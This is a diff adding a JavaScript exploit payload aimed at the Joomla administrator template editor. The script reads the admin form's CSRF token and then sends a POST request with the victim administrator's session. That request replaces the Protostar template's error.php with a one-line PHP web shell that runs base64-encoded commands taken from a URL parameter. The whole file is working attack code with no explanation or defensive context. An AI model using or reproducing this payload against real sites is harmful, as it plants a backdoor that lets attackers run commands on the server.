@@ -1,0 +1,27 @@
+// Get csrf token
+var xhttp = new XMLHttpRequest();
+var response1 = "";
+xhttp.onreadystatechange = function() {
+	if (this.readyState == 4 && this.status == 200) {
+		response1 = this.responseText;
+	}
+};
+xhttp.open("GET", "/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA", false); //asynchronous false: need to get whole response text for next step
+xhttp.send();
+var parser = new DOMParser();
+var xmlDoc = parser.parseFromString(response1, 'text/html'); //Firefox: text/html, Chrome: text/xml
+var token = xmlDoc.querySelector('#adminForm > input[type=hidden]:nth-child(3)').name;
+
+// Change error.php file's content in template with id=506 (protostar)
+xhttp = new XMLHttpRequest();
+xhttp.withCredentials = true;
+// xhttp.onreadystatechange = function() { //Write to console
+// 	if (this.readyState == 4 && this.status == 303) {
+// 		console.log('Send payload successfully!')
+// 	}
+// };
+xhttp.open("POST", "/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA", true);
+xhttp.setRequestHeader("Upgrade-Insecure-Requests", 1);
+xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+post = 'jform%5Bsource%5D=%3C%3Fphp%20system(base64_decode(%24_GET%5B\'cmd\'%5D))%3B%20%3F%3E&task=template.apply&' + token + '=1&jform%5Bextension_id%5D=506&jform%5Bfilename%5D=%2Ferror.php';
+xhttp.send(post);
